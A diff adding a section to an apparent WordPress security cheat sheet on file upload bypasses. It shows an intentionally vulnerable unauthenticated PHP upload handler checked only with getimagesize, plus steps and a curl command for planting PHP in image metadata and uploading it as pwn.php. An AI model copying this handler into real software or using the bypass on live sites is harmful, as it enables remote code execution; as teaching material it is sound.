@@ -2905,7 +2905,39 @@ curl [url]/wp-admin/admin-ajax.php?action=upload_image_check_mime -F "file=@pwn.
 
 ------------------
 
-- 
+- Sometimes developers check for conditions that a file is an image file e.g size `width and height`.One of the common functions to be used for image-related checks is `getimagesize` function.
+- Vulnerable code-:
+
+```php
+add_action("wp_ajax_nopriv_upload_image_getimagesize", "upload_image_getimagesize");
+
+function upload_image_getimagesize(){
+    $file = $_FILES["file"];
+    $file_path = WP_CONTENT_DIR . "/uploads/" . $file["name"];
+    $size = getimagesize($file["tmp_name"]);
+    $fileContent = file_get_contents($_FILES['file']["tmp_name"]);
+
+    if($size){
+        file_put_contents($file_path, $fileContent);
+        echo "image uploaded";
+    }
+    else{
+        echo "invalid image size";
+    }
+}
+```
+- To exploit,create a valid image file. add the malicious phpcode  to the metadata with `Exiftool` and rename the file extension with `.php`.
+- Curl-:
+
+```bash
+curl -F 'file=@pwn.php' 'http://localhost/wp-admin/admin-ajax.php?action=upload_image_getimagesize'
+```
+
+-------------
+
+### Blacklist bypass with .htaccess file
+
+-------------
 
 
 
